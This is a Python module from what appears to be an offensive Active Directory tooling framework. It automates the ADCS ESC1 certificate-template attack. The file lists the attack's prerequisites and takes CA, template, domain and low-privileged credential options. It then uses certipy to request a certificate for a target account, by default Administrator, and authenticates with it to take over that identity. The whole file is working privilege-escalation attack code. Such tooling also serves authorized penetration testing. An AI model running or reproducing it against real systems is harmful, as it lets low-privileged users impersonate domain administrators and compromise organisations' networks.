import os

from module import BaseModule
from tool import Tool

class ADCSESC2(BaseModule):
    name = "ADCS - ESC1"
    path = "adcs/esc1"
    description = "ESC1: Enrollee-Supplied Subject for Client Authentication"
    info = """A certificate template is configured to allow low-privileged users to enroll and specify a different Subject Alternative Name (SAN), enabling them to request a certificate as any user (e.g., Domain Admin) for client authentication.

Prerequisites:
  - Enrollment Rights: The attacker has enrollment rights on a vulnerable template.
  - Template Config: The template has:
  - CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT (Client Authentication EKU).
  - No manager approval is required (CT_FLAG_PEND_ALL_REQUESTS is not set).
  - The template defines Any Purpose or Client Authentication EKU."""

    options = {
        "ca_host": {"default": "", "description": "ADCS CA Server IP or host address", "required": True},
        "ca_name": {"default": "", "description": "ADCS CA Name", "required": True},
        "dc_ip": {"default": "", "description": "DC IP or host address. If empty, domain will be used.", "required": False},
        "template": {"default": "", "description": "ESC1 vulnerable template", "required": True},
        "target_account": {"default": "Administrator", "description": "Account to attempt to compromise", "required": True},
        "domain": {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }

    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    async def run(self):
        if not self.validate_options():
            return

        os.chdir(self.logs_dir)
        tool = Tool(self)
        if not tool.set_auth(from_module=True):
            return

        pfx = self.uniq_filename(self.opts.target_account)
    
        tool.title("Request the certificate for the target user")
        if not await tool.certipy_req(['-template', self.opts.template, '-upn', f"{self.opts.target_account}@{self.opts.domain}", "-out", pfx]):
            return

        tool.title("Authenticate using the obtained certificate")
        if not await tool.certipy_auth(pfx, ['-no-save']):
            return

        self.pane_b.write("[bold green][*] Attack successful.[/bold green]")
